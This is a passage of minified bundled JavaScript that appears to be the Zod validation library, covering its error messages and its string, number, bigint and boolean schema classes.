                    n = "Invalid discriminator value. Expected ".concat(pi.joinValues(e.options));
                    break;
                case yi.invalid_enum_value:
                    n = "Invalid enum value. Expected ".concat(pi.joinValues(e.options), ", received '").concat(e.received, "'");
                    break;
                case yi.invalid_arguments:
                    n = "Invalid function arguments";
                    break;
                case yi.invalid_return_type:
                    n = "Invalid function return type";
                    break;
                case yi.invalid_date:
                    n = "Invalid date";
                    break;
                case yi.invalid_string:
                    "object" === typeof e.validation ? "includes" in e.validation ? (n = 'Invalid input: must include "'.concat(e.validation.includes, '"'), "number" === typeof e.validation.position && (n = "".concat(n, " at one or more positions greater than or equal to ").concat(e.validation.position))) : "startsWith" in e.validation ? n = 'Invalid input: must start with "'.concat(e.validation.startsWith, '"') : "endsWith" in e.validation ? n = 'Invalid input: must end with "'.concat(e.validation.endsWith, '"') : pi.assertNever(e.validation) : n = "regex" !== e.validation ? "Invalid ".concat(e.validation) : "Invalid";
                    break;
                case yi.too_small:
                    n = "array" === e.type ? "Array must contain ".concat(e.exact ? "exactly" : e.inclusive ? "at least" : "more than", " ").concat(e.minimum, " element(s)") : "string" === e.type ? "String must contain ".concat(e.exact ? "exactly" : e.inclusive ? "at least" : "over", " ").concat(e.minimum, " character(s)") : "number" === e.type ? "Number must be ".concat(e.exact ? "exactly equal to " : e.inclusive ? "greater than or equal to " : "greater than ").concat(e.minimum) : "date" === e.type ? "Date must be ".concat(e.exact ? "exactly equal to " : e.inclusive ? "greater than or equal to " : "greater than ").concat(new Date(Number(e.minimum))) : "Invalid input";
                    break;
                case yi.too_big:
                    n = "array" === e.type ? "Array must contain ".concat(e.exact ? "exactly" : e.inclusive ? "at most" : "less than", " ").concat(e.maximum, " element(s)") : "string" === e.type ? "String must contain ".concat(e.exact ? "exactly" : e.inclusive ? "at most" : "under", " ").concat(e.maximum, " character(s)") : "number" === e.type ? "Number must be ".concat(e.exact ? "exactly" : e.inclusive ? "less than or equal to" : "less than", " ").concat(e.maximum) : "bigint" === e.type ? "BigInt must be ".concat(e.exact ? "exactly" : e.inclusive ? "less than or equal to" : "less than", " ").concat(e.maximum) : "date" === e.type ? "Date must be ".concat(e.exact ? "exactly" : e.inclusive ? "smaller than or equal to" : "smaller than", " ").concat(new Date(Number(e.maximum))) : "Invalid input";
                    break;
                case yi.custom:
                    n = "Invalid input";
                    break;
                case yi.invalid_intersection_types:
                    n = "Intersection results could not be merged";
                    break;
                case yi.not_multiple_of:
                    n = "Number must be a multiple of ".concat(e.multipleOf);
                    break;
                case yi.not_finite:
                    n = "Number must be finite";
                    break;
                default:
                    n = t.defaultError, pi.assertNever(e)
            }
            return {
                message: n
            }
        };
        let xi = wi;

        function Ai() {
            return xi
        }
        const ki = e => {
            const {
                data: t,
                path: n,
                errorMaps: r,
                issueData: i
            } = e, o = [...n, ...i.path || []], a = { ...i,
                path: o
            };
            let s = "";
            const c = r.filter((e => !!e)).slice().reverse();
            for (const l of c) s = l(a, {
                data: t,
                defaultError: s
            }).message;
            return { ...i,
                path: o,
                message: i.message || s
            }
        };

        function Ei(e, t) {
            const n = ki({
                issueData: t,
                data: e.data,
                path: e.path,
                errorMaps: [e.common.contextualErrorMap, e.schemaErrorMap, Ai(), wi].filter((e => !!e))
            });
            e.common.issues.push(n)
        }
        class Si {
            constructor() {
                this.value = "valid"
            }
            dirty() {
                "valid" === this.value && (this.value = "dirty")
            }
            abort() {
                "aborted" !== this.value && (this.value = "aborted")
            }
            static mergeArray(e, t) {
                const n = [];
                for (const r of t) {
                    if ("aborted" === r.status) return Ci;
                    "dirty" === r.status && e.dirty(), n.push(r.value)
                }
                return {
                    status: e.value,
                    value: n
                }
            }
            static async mergeObjectAsync(e, t) {
                const n = [];
                for (const r of t) n.push({
                    key: await r.key,
                    value: await r.value
                });
                return Si.mergeObjectSync(e, n)
            }
            static mergeObjectSync(e, t) {
                const n = {};
                for (const r of t) {
                    const {
                        key: t,
                        value: i
                    } = r;
                    if ("aborted" === t.status) return Ci;
                    if ("aborted" === i.status) return Ci;
                    "dirty" === t.status && e.dirty(), "dirty" === i.status && e.dirty(), "__proto__" === t.value || "undefined" === typeof i.value && !r.alwaysSet || (n[t.value] = i.value)
                }
                return {
                    status: e.value,
                    value: n
                }
            }
        }
        const Ci = Object.freeze({
                status: "aborted"
            }),
            _i = e => ({
                status: "dirty",
                value: e
            }),
            Ii = e => ({
                status: "valid",
                value: e
            }),
            Pi = e => "aborted" === e.status,
            Ti = e => "dirty" === e.status,
            Bi = e => "valid" === e.status,
            Ni = e => "undefined" !== typeof Promise && e instanceof Promise;
        var Oi;
        ! function(e) {
            e.errToObj = e => "string" === typeof e ? {
                message: e
            } : e || {}, e.toString = e => "string" === typeof e ? e : null === e || void 0 === e ? void 0 : e.message
        }(Oi || (Oi = {}));
        class Ri {
            constructor(e, t, n, r) {
                this._cachedPath = [], this.parent = e, this.data = t, this._path = n, this._key = r
            }
            get path() {
                return this._cachedPath.length || (this._key instanceof Array ? this._cachedPath.push(...this._path, ...this._key) : this._cachedPath.push(...this._path, this._key)), this._cachedPath
            }
        }
        const Mi = (e, t) => {
            if (Bi(t)) return {
                success: !0,
                data: t.value
            };
            if (!e.common.issues.length) throw new Error("Validation failed but no issues detected.");
            return {
                success: !1,
                get error() {
                    if (this._error) return this._error;
                    const t = new bi(e.common.issues);
                    return this._error = t, this._error
                }
            }
        };

        function ji(e) {
            if (!e) return {};
            const {
                errorMap: t,
                invalid_type_error: n,
                required_error: r,
                description: i
            } = e;
            if (t && (n || r)) throw new Error('Can\'t use "invalid_type_error" or "required_error" in conjunction with custom error map.');
            if (t) return {
                errorMap: t,
                description: i
            };
            return {
                errorMap: (e, t) => "invalid_type" !== e.code ? {
                    message: t.defaultError
                } : "undefined" === typeof t.data ? {
                    message: null !== r && void 0 !== r ? r : t.defaultError
                } : {
                    message: null !== n && void 0 !== n ? n : t.defaultError
                },
                description: i
            }
        }
        class Fi {
            constructor(e) {
                this.spa = this.safeParseAsync, this._def = e, this.parse = this.parse.bind(this), this.safeParse = this.safeParse.bind(this), this.parseAsync = this.parseAsync.bind(this), this.safeParseAsync = this.safeParseAsync.bind(this), this.spa = this.spa.bind(this), this.refine = this.refine.bind(this), this.refinement = this.refinement.bind(this), this.superRefine = this.superRefine.bind(this), this.optional = this.optional.bind(this), this.nullable = this.nullable.bind(this), this.nullish = this.nullish.bind(this), this.array = this.array.bind(this), this.promise = this.promise.bind(this), this.or = this.or.bind(this), this.and = this.and.bind(this), this.transform = this.transform.bind(this), this.brand = this.brand.bind(this), this.default = this.default.bind(this), this.catch = this.catch.bind(this), this.describe = this.describe.bind(this), this.pipe = this.pipe.bind(this), this.readonly = this.readonly.bind(this), this.isNullable = this.isNullable.bind(this), this.isOptional = this.isOptional.bind(this)
            }
            get description() {
                return this._def.description
            }
            _getType(e) {
                return vi(e.data)
            }
            _getOrReturnCtx(e, t) {
                return t || {
                    common: e.parent.common,
                    data: e.data,
                    parsedType: vi(e.data),
                    schemaErrorMap: this._def.errorMap,
                    path: e.path,
                    parent: e.parent
                }
            }
            _processInputParams(e) {
                return {
                    status: new Si,
                    ctx: {
                        common: e.parent.common,
                        data: e.data,
                        parsedType: vi(e.data),
                        schemaErrorMap: this._def.errorMap,
                        path: e.path,
                        parent: e.parent
                    }
                }
            }
            _parseSync(e) {
                const t = this._parse(e);
                if (Ni(t)) throw new Error("Synchronous parse encountered promise.");
                return t
            }
            _parseAsync(e) {
                const t = this._parse(e);
                return Promise.resolve(t)
            }
            parse(e, t) {
                const n = this.safeParse(e, t);
                if (n.success) return n.data;
                throw n.error
            }
            safeParse(e, t) {
                var n;
                const r = {
                        common: {
                            issues: [],
                            async: null !== (n = null === t || void 0 === t ? void 0 : t.async) && void 0 !== n && n,
                            contextualErrorMap: null === t || void 0 === t ? void 0 : t.errorMap
                        },
                        path: (null === t || void 0 === t ? void 0 : t.path) || [],
                        schemaErrorMap: this._def.errorMap,
                        parent: null,
                        data: e,
                        parsedType: vi(e)
                    },
                    i = this._parseSync({
                        data: e,
                        path: r.path,
                        parent: r
                    });
                return Mi(r, i)
            }
            async parseAsync(e, t) {
                const n = await this.safeParseAsync(e, t);
                if (n.success) return n.data;
                throw n.error
            }
            async safeParseAsync(e, t) {
                const n = {
                        common: {
                            issues: [],
                            contextualErrorMap: null === t || void 0 === t ? void 0 : t.errorMap,
                            async: !0
                        },
                        path: (null === t || void 0 === t ? void 0 : t.path) || [],
                        schemaErrorMap: this._def.errorMap,
                        parent: null,
                        data: e,
                        parsedType: vi(e)
                    },
                    r = this._parse({
                        data: e,
                        path: n.path,
                        parent: n
                    }),
                    i = await (Ni(r) ? r : Promise.resolve(r));
                return Mi(n, i)
            }
            refine(e, t) {
                const n = e => "string" === typeof t || "undefined" === typeof t ? {
                    message: t
                } : "function" === typeof t ? t(e) : t;
                return this._refinement(((t, r) => {
                    const i = e(t),
                        o = () => r.addIssue({
                            code: yi.custom,
                            ...n(t)
                        });
                    return "undefined" !== typeof Promise && i instanceof Promise ? i.then((e => !!e || (o(), !1))) : !!i || (o(), !1)
                }))
            }
            refinement(e, t) {
                return this._refinement(((n, r) => !!e(n) || (r.addIssue("function" === typeof t ? t(n, r) : t), !1)))
            }
            _refinement(e) {
                return new Co({
                    schema: this,
                    typeName: Lo.ZodEffects,
                    effect: {
                        type: "refinement",
                        refinement: e
                    }
                })
            }
            superRefine(e) {
                return this._refinement(e)
            }
            optional() {
                return _o.create(this, this._def)
            }
            nullable() {
                return Io.create(this, this._def)
            }
            nullish() {
                return this.nullable().optional()
            }
            array() {
                return ao.create(this, this._def)
            }
            promise() {
                return So.create(this, this._def)
            }
            or(e) {
                return lo.create([this, e], this._def)
            }
            and(e) {
                return po.create(this, e, this._def)
            }
            transform(e) {
                return new Co({ ...ji(this._def),
                    schema: this,
                    typeName: Lo.ZodEffects,
                    effect: {
                        type: "transform",
                        transform: e
                    }
                })
            }
            default (e) {
                const t = "function" === typeof e ? e : () => e;
                return new Po({ ...ji(this._def),
                    innerType: this,
                    defaultValue: t,
                    typeName: Lo.ZodDefault
                })
            }
            brand() {
                return new Oo({
                    typeName: Lo.ZodBranded,
                    type: this,
                    ...ji(this._def)
                })
            } catch (e) {
                const t = "function" === typeof e ? e : () => e;
                return new To({ ...ji(this._def),
                    innerType: this,
                    catchValue: t,
                    typeName: Lo.ZodCatch
                })
            }
            describe(e) {
                return new(0, this.constructor)({ ...this._def,
                    description: e
                })
            }
            pipe(e) {
                return Ro.create(this, e)
            }
            readonly() {
                return Mo.create(this)
            }
            isOptional() {
                return this.safeParse(void 0).success
            }
            isNullable() {
                return this.safeParse(null).success
            }
        }
        const Li = /^c[^\s-]{8,}$/i,
            Di = /^[a-z][a-z0-9]*$/,
            Hi = /^[0-9A-HJKMNP-TV-Z]{26}$/,
            Ui = /^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,
            zi = /^(?!\.)(?!.*\.\.)([A-Z0-9_+-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i;
        let Gi;
        const qi = /^(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))$/,
            Qi = /^(([a-f0-9]{1,4}:){7}|::([a-f0-9]{1,4}:){0,6}|([a-f0-9]{1,4}:){1}:([a-f0-9]{1,4}:){0,5}|([a-f0-9]{1,4}:){2}:([a-f0-9]{1,4}:){0,4}|([a-f0-9]{1,4}:){3}:([a-f0-9]{1,4}:){0,3}|([a-f0-9]{1,4}:){4}:([a-f0-9]{1,4}:){0,2}|([a-f0-9]{1,4}:){5}:([a-f0-9]{1,4}:){0,1})([a-f0-9]{1,4}|(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2})))$/;

        function Wi(e, t) {
            return !("v4" !== t && t || !qi.test(e)) || !("v6" !== t && t || !Qi.test(e))
        }
        class Vi extends Fi {
            _parse(e) {
                this._def.coerce && (e.data = String(e.data));
                if (this._getType(e) !== gi.string) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.string,
                        received: t.parsedType
                    }), Ci
                }
                const t = new Si;
                let n;
                for (const i of this._def.checks)
                    if ("min" === i.kind) e.data.length < i.value && (n = this._getOrReturnCtx(e, n), Ei(n, {
                        code: yi.too_small,
                        minimum: i.value,
                        type: "string",
                        inclusive: !0,
                        exact: !1,
                        message: i.message
                    }), t.dirty());
                    else if ("max" === i.kind) e.data.length > i.value && (n = this._getOrReturnCtx(e, n), Ei(n, {
                    code: yi.too_big,
                    maximum: i.value,
                    type: "string",
                    inclusive: !0,
                    exact: !1,
                    message: i.message
                }), t.dirty());
                else if ("length" === i.kind) {
                    const r = e.data.length > i.value,
                        o = e.data.length < i.value;
                    (r || o) && (n = this._getOrReturnCtx(e, n), r ? Ei(n, {
                        code: yi.too_big,
                        maximum: i.value,
                        type: "string",
                        inclusive: !0,
                        exact: !0,
                        message: i.message
                    }) : o && Ei(n, {
                        code: yi.too_small,
                        minimum: i.value,
                        type: "string",
                        inclusive: !0,
                        exact: !0,
                        message: i.message
                    }), t.dirty())
                } else if ("email" === i.kind) zi.test(e.data) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    validation: "email",
                    code: yi.invalid_string,
                    message: i.message
                }), t.dirty());
                else if ("emoji" === i.kind) Gi || (Gi = new RegExp("^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$", "u")), Gi.test(e.data) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    validation: "emoji",
                    code: yi.invalid_string,
                    message: i.message
                }), t.dirty());
                else if ("uuid" === i.kind) Ui.test(e.data) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    validation: "uuid",
                    code: yi.invalid_string,
                    message: i.message
                }), t.dirty());
                else if ("cuid" === i.kind) Li.test(e.data) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    validation: "cuid",
                    code: yi.invalid_string,
                    message: i.message
                }), t.dirty());
                else if ("cuid2" === i.kind) Di.test(e.data) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    validation: "cuid2",
                    code: yi.invalid_string,
                    message: i.message
                }), t.dirty());
                else if ("ulid" === i.kind) Hi.test(e.data) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    validation: "ulid",
                    code: yi.invalid_string,
                    message: i.message
                }), t.dirty());
                else if ("url" === i.kind) try {
                    new URL(e.data)
                } catch (ol) {
                    n = this._getOrReturnCtx(e, n), Ei(n, {
                        validation: "url",
                        code: yi.invalid_string,
                        message: i.message
                    }), t.dirty()
                } else if ("regex" === i.kind) {
                    i.regex.lastIndex = 0;
                    i.regex.test(e.data) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                        validation: "regex",
                        code: yi.invalid_string,
                        message: i.message
                    }), t.dirty())
                } else if ("trim" === i.kind) e.data = e.data.trim();
                else if ("includes" === i.kind) e.data.includes(i.value, i.position) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    code: yi.invalid_string,
                    validation: {
                        includes: i.value,
                        position: i.position
                    },
                    message: i.message
                }), t.dirty());
                else if ("toLowerCase" === i.kind) e.data = e.data.toLowerCase();
                else if ("toUpperCase" === i.kind) e.data = e.data.toUpperCase();
                else if ("startsWith" === i.kind) e.data.startsWith(i.value) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    code: yi.invalid_string,
                    validation: {
                        startsWith: i.value
                    },
                    message: i.message
                }), t.dirty());
                else if ("endsWith" === i.kind) e.data.endsWith(i.value) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    code: yi.invalid_string,
                    validation: {
                        endsWith: i.value
                    },
                    message: i.message
                }), t.dirty());
                else if ("datetime" === i.kind) {
                    ((r = i).precision ? r.offset ? new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{".concat(r.precision, "}(([+-]\\d{2}(:?\\d{2})?)|Z)$")) : new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{".concat(r.precision, "}Z$")) : 0 === r.precision ? r.offset ? new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(([+-]\\d{2}(:?\\d{2})?)|Z)$") : new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}Z$") : r.offset ? new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?(([+-]\\d{2}(:?\\d{2})?)|Z)$") : new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?Z$")).test(e.data) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                        code: yi.invalid_string,
                        validation: "datetime",
                        message: i.message
                    }), t.dirty())
                } else "ip" === i.kind ? Wi(e.data, i.version) || (n = this._getOrReturnCtx(e, n), Ei(n, {
                    validation: "ip",
                    code: yi.invalid_string,
                    message: i.message
                }), t.dirty()) : pi.assertNever(i);
                var r;
                return {
                    status: t.value,
                    value: e.data
                }
            }
            _regex(e, t, n) {
                return this.refinement((t => e.test(t)), {
                    validation: t,
                    code: yi.invalid_string,
                    ...Oi.errToObj(n)
                })
            }
            _addCheck(e) {
                return new Vi({ ...this._def,
                    checks: [...this._def.checks, e]
                })
            }
            email(e) {
                return this._addCheck({
                    kind: "email",
                    ...Oi.errToObj(e)
                })
            }
            url(e) {
                return this._addCheck({
                    kind: "url",
                    ...Oi.errToObj(e)
                })
            }
            emoji(e) {
                return this._addCheck({
                    kind: "emoji",
                    ...Oi.errToObj(e)
                })
            }
            uuid(e) {
                return this._addCheck({
                    kind: "uuid",
                    ...Oi.errToObj(e)
                })
            }
            cuid(e) {
                return this._addCheck({
                    kind: "cuid",
                    ...Oi.errToObj(e)
                })
            }
            cuid2(e) {
                return this._addCheck({
                    kind: "cuid2",
                    ...Oi.errToObj(e)
                })
            }
            ulid(e) {
                return this._addCheck({
                    kind: "ulid",
                    ...Oi.errToObj(e)
                })
            }
            ip(e) {
                return this._addCheck({
                    kind: "ip",
                    ...Oi.errToObj(e)
                })
            }
            datetime(e) {
                var t;
                return "string" === typeof e ? this._addCheck({
                    kind: "datetime",
                    precision: null,
                    offset: !1,
                    message: e
                }) : this._addCheck({
                    kind: "datetime",
                    precision: "undefined" === typeof(null === e || void 0 === e ? void 0 : e.precision) ? null : null === e || void 0 === e ? void 0 : e.precision,
                    offset: null !== (t = null === e || void 0 === e ? void 0 : e.offset) && void 0 !== t && t,
                    ...Oi.errToObj(null === e || void 0 === e ? void 0 : e.message)
                })
            }
            regex(e, t) {
                return this._addCheck({
                    kind: "regex",
                    regex: e,
                    ...Oi.errToObj(t)
                })
            }
            includes(e, t) {
                return this._addCheck({
                    kind: "includes",
                    value: e,
                    position: null === t || void 0 === t ? void 0 : t.position,
                    ...Oi.errToObj(null === t || void 0 === t ? void 0 : t.message)
                })
            }
            startsWith(e, t) {
                return this._addCheck({
                    kind: "startsWith",
                    value: e,
                    ...Oi.errToObj(t)
                })
            }
            endsWith(e, t) {
                return this._addCheck({
                    kind: "endsWith",
                    value: e,
                    ...Oi.errToObj(t)
                })
            }
            min(e, t) {
                return this._addCheck({
                    kind: "min",
                    value: e,
                    ...Oi.errToObj(t)
                })
            }
            max(e, t) {
                return this._addCheck({
                    kind: "max",
                    value: e,
                    ...Oi.errToObj(t)
                })
            }
            length(e, t) {
                return this._addCheck({
                    kind: "length",
                    value: e,
                    ...Oi.errToObj(t)
                })
            }
            nonempty(e) {
                return this.min(1, Oi.errToObj(e))
            }
            trim() {
                return new Vi({ ...this._def,
                    checks: [...this._def.checks, {
                        kind: "trim"
                    }]
                })
            }
            toLowerCase() {
                return new Vi({ ...this._def,
                    checks: [...this._def.checks, {
                        kind: "toLowerCase"
                    }]
                })
            }
            toUpperCase() {
                return new Vi({ ...this._def,
                    checks: [...this._def.checks, {
                        kind: "toUpperCase"
                    }]
                })
            }
            get isDatetime() {
                return !!this._def.checks.find((e => "datetime" === e.kind))
            }
            get isEmail() {
                return !!this._def.checks.find((e => "email" === e.kind))
            }
            get isURL() {
                return !!this._def.checks.find((e => "url" === e.kind))
            }
            get isEmoji() {
                return !!this._def.checks.find((e => "emoji" === e.kind))
            }
            get isUUID() {
                return !!this._def.checks.find((e => "uuid" === e.kind))
            }
            get isCUID() {
                return !!this._def.checks.find((e => "cuid" === e.kind))
            }
            get isCUID2() {
                return !!this._def.checks.find((e => "cuid2" === e.kind))
            }
            get isULID() {
                return !!this._def.checks.find((e => "ulid" === e.kind))
            }
            get isIP() {
                return !!this._def.checks.find((e => "ip" === e.kind))
            }
            get minLength() {
                let e = null;
                for (const t of this._def.checks) "min" === t.kind && (null === e || t.value > e) && (e = t.value);
                return e
            }
            get maxLength() {
                let e = null;
                for (const t of this._def.checks) "max" === t.kind && (null === e || t.value < e) && (e = t.value);
                return e
            }
        }

        function Zi(e, t) {
            const n = (e.toString().split(".")[1] || "").length,
                r = (t.toString().split(".")[1] || "").length,
                i = n > r ? n : r;
            return parseInt(e.toFixed(i).replace(".", "")) % parseInt(t.toFixed(i).replace(".", "")) / Math.pow(10, i)
        }
        Vi.create = e => {
            var t;
            return new Vi({
                checks: [],
                typeName: Lo.ZodString,
                coerce: null !== (t = null === e || void 0 === e ? void 0 : e.coerce) && void 0 !== t && t,
                ...ji(e)
            })
        };
        class Ki extends Fi {
            constructor() {
                super(...arguments), this.min = this.gte, this.max = this.lte, this.step = this.multipleOf
            }
            _parse(e) {
                this._def.coerce && (e.data = Number(e.data));
                if (this._getType(e) !== gi.number) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.number,
                        received: t.parsedType
                    }), Ci
                }
                let t;
                const n = new Si;
                for (const r of this._def.checks)
                    if ("int" === r.kind) pi.isInteger(e.data) || (t = this._getOrReturnCtx(e, t), Ei(t, {
                        code: yi.invalid_type,
                        expected: "integer",
                        received: "float",
                        message: r.message
                    }), n.dirty());
                    else if ("min" === r.kind) {
                    (r.inclusive ? e.data < r.value : e.data <= r.value) && (t = this._getOrReturnCtx(e, t), Ei(t, {
                        code: yi.too_small,
                        minimum: r.value,
                        type: "number",
                        inclusive: r.inclusive,
                        exact: !1,
                        message: r.message
                    }), n.dirty())
                } else if ("max" === r.kind) {
                    (r.inclusive ? e.data > r.value : e.data >= r.value) && (t = this._getOrReturnCtx(e, t), Ei(t, {
                        code: yi.too_big,
                        maximum: r.value,
                        type: "number",
                        inclusive: r.inclusive,
                        exact: !1,
                        message: r.message
                    }), n.dirty())
                } else "multipleOf" === r.kind ? 0 !== Zi(e.data, r.value) && (t = this._getOrReturnCtx(e, t), Ei(t, {
                    code: yi.not_multiple_of,
                    multipleOf: r.value,
                    message: r.message
                }), n.dirty()) : "finite" === r.kind ? Number.isFinite(e.data) || (t = this._getOrReturnCtx(e, t), Ei(t, {
                    code: yi.not_finite,
                    message: r.message
                }), n.dirty()) : pi.assertNever(r);
                return {
                    status: n.value,
                    value: e.data
                }
            }
            gte(e, t) {
                return this.setLimit("min", e, !0, Oi.toString(t))
            }
            gt(e, t) {
                return this.setLimit("min", e, !1, Oi.toString(t))
            }
            lte(e, t) {
                return this.setLimit("max", e, !0, Oi.toString(t))
            }
            lt(e, t) {
                return this.setLimit("max", e, !1, Oi.toString(t))
            }
            setLimit(e, t, n, r) {
                return new Ki({ ...this._def,
                    checks: [...this._def.checks, {
                        kind: e,
                        value: t,
                        inclusive: n,
                        message: Oi.toString(r)
                    }]
                })
            }
            _addCheck(e) {
                return new Ki({ ...this._def,
                    checks: [...this._def.checks, e]
                })
            }
            int(e) {
                return this._addCheck({
                    kind: "int",
                    message: Oi.toString(e)
                })
            }
            positive(e) {
                return this._addCheck({
                    kind: "min",
                    value: 0,
                    inclusive: !1,
                    message: Oi.toString(e)
                })
            }
            negative(e) {
                return this._addCheck({
                    kind: "max",
                    value: 0,
                    inclusive: !1,
                    message: Oi.toString(e)
                })
            }
            nonpositive(e) {
                return this._addCheck({
                    kind: "max",
                    value: 0,
                    inclusive: !0,
                    message: Oi.toString(e)
                })
            }
            nonnegative(e) {
                return this._addCheck({
                    kind: "min",
                    value: 0,
                    inclusive: !0,
                    message: Oi.toString(e)
                })
            }
            multipleOf(e, t) {
                return this._addCheck({
                    kind: "multipleOf",
                    value: e,
                    message: Oi.toString(t)
                })
            }
            finite(e) {
                return this._addCheck({
                    kind: "finite",
                    message: Oi.toString(e)
                })
            }
            safe(e) {
                return this._addCheck({
                    kind: "min",
                    inclusive: !0,
                    value: Number.MIN_SAFE_INTEGER,
                    message: Oi.toString(e)
                })._addCheck({
                    kind: "max",
                    inclusive: !0,
                    value: Number.MAX_SAFE_INTEGER,
                    message: Oi.toString(e)
                })
            }
            get minValue() {
                let e = null;
                for (const t of this._def.checks) "min" === t.kind && (null === e || t.value > e) && (e = t.value);
                return e
            }
            get maxValue() {
                let e = null;
                for (const t of this._def.checks) "max" === t.kind && (null === e || t.value < e) && (e = t.value);
                return e
            }
            get isInt() {
                return !!this._def.checks.find((e => "int" === e.kind || "multipleOf" === e.kind && pi.isInteger(e.value)))
            }
            get isFinite() {
                let e = null,
                    t = null;
                for (const n of this._def.checks) {
                    if ("finite" === n.kind || "int" === n.kind || "multipleOf" === n.kind) return !0;
                    "min" === n.kind ? (null === t || n.value > t) && (t = n.value) : "max" === n.kind && (null === e || n.value < e) && (e = n.value)
                }
                return Number.isFinite(t) && Number.isFinite(e)
            }
        }
        Ki.create = e => new Ki({
            checks: [],
            typeName: Lo.ZodNumber,
            coerce: (null === e || void 0 === e ? void 0 : e.coerce) || !1,
            ...ji(e)
        });
        class Ji extends Fi {
            constructor() {
                super(...arguments), this.min = this.gte, this.max = this.lte
            }
            _parse(e) {
                this._def.coerce && (e.data = BigInt(e.data));
                if (this._getType(e) !== gi.bigint) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.bigint,
                        received: t.parsedType
                    }), Ci
                }
                let t;
                const n = new Si;
                for (const r of this._def.checks)
                    if ("min" === r.kind) {
                        (r.inclusive ? e.data < r.value : e.data <= r.value) && (t = this._getOrReturnCtx(e, t), Ei(t, {
                            code: yi.too_small,
                            type: "bigint",
                            minimum: r.value,
                            inclusive: r.inclusive,
                            message: r.message
                        }), n.dirty())
                    } else if ("max" === r.kind) {
                    (r.inclusive ? e.data > r.value : e.data >= r.value) && (t = this._getOrReturnCtx(e, t), Ei(t, {
                        code: yi.too_big,
                        type: "bigint",
                        maximum: r.value,
                        inclusive: r.inclusive,
                        message: r.message
                    }), n.dirty())
                } else "multipleOf" === r.kind ? e.data % r.value !== BigInt(0) && (t = this._getOrReturnCtx(e, t), Ei(t, {
                    code: yi.not_multiple_of,
                    multipleOf: r.value,
                    message: r.message
                }), n.dirty()) : pi.assertNever(r);
                return {
                    status: n.value,
                    value: e.data
                }
            }
            gte(e, t) {
                return this.setLimit("min", e, !0, Oi.toString(t))
            }
            gt(e, t) {
                return this.setLimit("min", e, !1, Oi.toString(t))
            }
            lte(e, t) {
                return this.setLimit("max", e, !0, Oi.toString(t))
            }
            lt(e, t) {
                return this.setLimit("max", e, !1, Oi.toString(t))
            }
            setLimit(e, t, n, r) {
                return new Ji({ ...this._def,
                    checks: [...this._def.checks, {
                        kind: e,
                        value: t,
                        inclusive: n,
                        message: Oi.toString(r)
                    }]
                })
            }
            _addCheck(e) {
                return new Ji({ ...this._def,
                    checks: [...this._def.checks, e]
                })
            }
            positive(e) {
                return this._addCheck({
                    kind: "min",
                    value: BigInt(0),
                    inclusive: !1,
                    message: Oi.toString(e)
                })
            }
            negative(e) {
                return this._addCheck({
                    kind: "max",
                    value: BigInt(0),
                    inclusive: !1,
                    message: Oi.toString(e)
                })
            }
            nonpositive(e) {
                return this._addCheck({
                    kind: "max",
                    value: BigInt(0),
                    inclusive: !0,
                    message: Oi.toString(e)
                })
            }
            nonnegative(e) {
                return this._addCheck({
                    kind: "min",
                    value: BigInt(0),
                    inclusive: !0,
                    message: Oi.toString(e)
                })
            }
            multipleOf(e, t) {
                return this._addCheck({
                    kind: "multipleOf",
                    value: e,
                    message: Oi.toString(t)
                })
            }
            get minValue() {
                let e = null;
                for (const t of this._def.checks) "min" === t.kind && (null === e || t.value > e) && (e = t.value);
                return e
            }
            get maxValue() {
                let e = null;
                for (const t of this._def.checks) "max" === t.kind && (null === e || t.value < e) && (e = t.value);
                return e
            }
        }
        Ji.create = e => {
            var t;
            return new Ji({
                checks: [],
                typeName: Lo.ZodBigInt,
                coerce: null !== (t = null === e || void 0 === e ? void 0 : e.coerce) && void 0 !== t && t,
                ...ji(e)
            })
        };
        class Yi extends Fi {
            _parse(e) {
                this._def.coerce && (e.data = Boolean(e.data));
                if (this._getType(e) !== gi.boolean) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.boolean,
                        received: t.parsedType
                    }), Ci
                }
                return Ii(e.data)
            }
        }
        Yi.create = e => new Yi({
            typeName: Lo.ZodBoolean,
            coerce: (null === e || void 0 === e ? void 0 : e.coerce) || !1,
            ...ji(e)
        });
        class Xi extends Fi {
            _parse(e) {
                this._def.coerce && (e.data = new Date(e.data));
                if (this._getType(e) !== gi.date) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
